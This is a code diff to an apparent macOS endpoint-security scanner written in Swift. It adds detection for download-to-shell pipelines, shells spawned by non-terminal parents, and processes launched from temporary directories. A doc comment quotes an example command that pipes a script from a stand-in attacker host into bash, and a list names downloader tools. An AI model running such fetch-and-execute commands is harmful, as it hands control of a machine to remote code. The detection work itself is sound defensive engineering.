@@ -257,6 +257,19 @@ struct ProcessScanner {
                         processInfo: proc,
                         metadata: ["reason": "lolbin", "parent": rawParentName]
                     ))
+                } else if Self.hasConcurrentDownloaderSibling(proc: proc, in: processes)
+                       || Self.hasPipeDownloadPattern(
+                              Self.parentCommandLine(for: proc.parentPID) ?? "") {
+                    // curl | bash / wget | bash — either a download tool shares the same
+                    // parent at the same moment, or the parent's argv contains a pipe pattern.
+                    signals.append(ThreatSignal(
+                        source: .process,
+                        severity: .critical,
+                        title: "Shell piped from download tool",
+                        description: "'\(proc.name)' (PID \(proc.pid)) is running concurrently with a download tool under parent '\(rawParentName.isEmpty ? "unknown" : rawParentName)', indicating a download-to-shell pipe attack.",
+                        processInfo: proc,
+                        metadata: ["reason": "curl_pipe_shell", "parent": rawParentName]
+                    ))
                 }
             }
         }
@@ -279,6 +292,145 @@ struct ProcessScanner {
             || path.hasPrefix("/System/")
             || path.hasPrefix("/Applications/")
             || path.hasPrefix("/Library/Apple/")
+    }
+
+    // MARK: - Pipe-Download Detection Helpers
+
+    /// Download tools that, when sharing a parent PID with a shell, indicate a
+    /// `curl | bash` style pipeline attack.
+    private static let downloaderNames: Set<String> = [
+        "curl", "wget", "python3", "python", "ruby", "perl", "php"
+    ]
+
+    /// Returns `true` when a sibling process (same parent PID) is a known download
+    /// tool.  Used to detect concurrent `curl | bash` pipelines in a process snapshot.
+    private static func hasConcurrentDownloaderSibling(
+        proc: NickProcessInfo,
+        in processes: [NickProcessInfo]
+    ) -> Bool {
+        processes.contains {
+            $0.pid != proc.pid
+                && $0.parentPID == proc.parentPID
+                && downloaderNames.contains($0.name.lowercased())
+        }
+    }
+
+    /// Reads a process's full argv via `KERN_PROCARGS2`.
+    /// Returns `nil` if the process is inaccessible (different UID, sandboxed, etc.).
+    private static func parentCommandLine(for pid: Int32) -> String? {
+        guard pid > 0 else { return nil }
+        var mib: [Int32] = [CTL_KERN, KERN_PROCARGS2, pid]
+        var size = 0
+        guard sysctl(&mib, 3, nil, &size, nil, 0) == 0, size > 4 else { return nil }
+        var buf = [UInt8](repeating: 0, count: size)
+        guard sysctl(&mib, 3, &buf, &size, nil, 0) == 0 else { return nil }
+        // First 4 bytes = argc; remaining bytes are null-terminated argument strings.
+        var parts: [String] = []
+        var current: [UInt8] = []
+        for byte in buf.dropFirst(4) {
+            if byte == 0 {
+                if !current.isEmpty {
+                    if let s = String(bytes: current, encoding: .utf8) { parts.append(s) }
+                    current = []
+                }
+            } else {
+                current.append(byte)
+            }
+        }
+        if !current.isEmpty, let s = String(bytes: current, encoding: .utf8) { parts.append(s) }
+        return parts.isEmpty ? nil : parts.joined(separator: " ")
+    }
+
+    /// Returns `true` when a command string contains a download-to-shell pipe pattern,
+    /// e.g. `curl https://evil.com/install.sh | bash` or `bash -c 'wget ... | sh'`.
+    private static func hasPipeDownloadPattern(_ cmd: String) -> Bool {
+        let lower = cmd.lowercased()
+        guard lower.contains("|") else { return false }
+        let hasDownloader = lower.contains("curl") || lower.contains("wget")
+        let hasShell = lower.range(
+            of: #"\b(bash|zsh|sh|ksh|csh|fish|dash)\b"#,
+            options: .regularExpression) != nil
+        return hasDownloader && hasShell
+    }
+
+    // MARK: - Fast New-Process Signal Detection
+
+    /// Derives signals only for processes whose PID was not present in the previous
+    /// snapshot (`newPIDs`).
+    ///
+    /// Unlike `signals(from:)`, this method:
+    /// - Uses path-based heuristics that fire even when `signingStatus == .pending`
+    ///   (useful for the 5-second fast-check tick before code-signing completes).
+    /// - Limits evaluation to `newPIDs` so long-running processes are not re-evaluated
+    ///   on every tick.
+    /// - Still uses the full `processes` array for parent-name resolution.
+    ///
+    /// - Parameters:
+    ///   - processes: Current full process snapshot (provides parent-PID context).
+    ///   - newPIDs: PIDs that did not appear in the previous snapshot.
+    ///   - trustedProcessList: Allowlist to suppress false positives.
+    /// - Returns: Signals for suspicious newly-spawned processes.
+    func signalsForNewProcesses(
+        all processes: [NickProcessInfo],
+        newPIDs: Set<Int32>,
+        trustedProcessList: TrustedProcessList = TrustedProcessList()
+    ) -> [ThreatSignal] {
+        guard !newPIDs.isEmpty else { return [] }
+        var results: [ThreatSignal] = []
+        let pidToName = Dictionary(uniqueKeysWithValues: processes.map { ($0.pid, $0.name) })
+
+        for proc in processes where newPIDs.contains(proc.pid) {
+            if trustedProcessList.isTrusted(proc.name) { continue }
+
+            // Path-based temp check — fires even when signing status is .pending.
+            if !proc.path.isEmpty, isTemporaryPath(proc.path) {
+                results.append(ThreatSignal(
+                    source: .process,
+                    severity: .high,
+                    title: "Process spawned from temporary directory",
+                    description: "New process '\(proc.name)' (PID \(proc.pid)) appeared at \(proc.path), a writable temporary location.",
+                    processInfo: proc,
+                    metadata: ["reason": "temp_path_spawn"]
+                ))
+                continue
+            }
+
+            // LOLBin and pipe-download detection.
+            if Self.shellProcessNames.contains(proc.name.lowercased()) {
+                let rawParentName = pidToName[proc.parentPID] ?? ""
+                let parentName = rawParentName.lowercased()
+                let hasTerminalParent = parentName.contains("terminal")
+                    || parentName.contains("iterm")
+                    || parentName.contains("warp")
+                    || parentName.contains("ssh")
+                    || parentName.contains("bash")
+                    || parentName.contains("zsh")
+                let parentTrusted = !rawParentName.isEmpty && trustedProcessList.isTrusted(rawParentName)
+                if !hasTerminalParent && !parentTrusted {
+                    results.append(ThreatSignal(
+                        source: .process,
+                        severity: .medium,
+                        title: "Shell spawned from non-terminal parent",
+                        description: "'\(proc.name)' (PID \(proc.pid)) was spawned by '\(rawParentName.isEmpty ? "unknown" : rawParentName)', which is not a recognized terminal.",
+                        processInfo: proc,
+                        metadata: ["reason": "lolbin", "parent": rawParentName]
+                    ))
+                } else if Self.hasConcurrentDownloaderSibling(proc: proc, in: processes)
+                       || Self.hasPipeDownloadPattern(
+                              Self.parentCommandLine(for: proc.parentPID) ?? "") {
+                    results.append(ThreatSignal(
+                        source: .process,
+                        severity: .critical,
+                        title: "Shell piped from download tool",
+                        description: "'\(proc.name)' (PID \(proc.pid)) appeared concurrently with a download tool under parent '\(rawParentName.isEmpty ? "unknown" : rawParentName)', indicating a pipe attack.",
+                        processInfo: proc,
+                        metadata: ["reason": "curl_pipe_shell", "parent": rawParentName]
+                    ))
+                }
+            }
+        }
+
+        return results
     }
 
     /// Produces a signing-status signal for a process whose status was just resolved
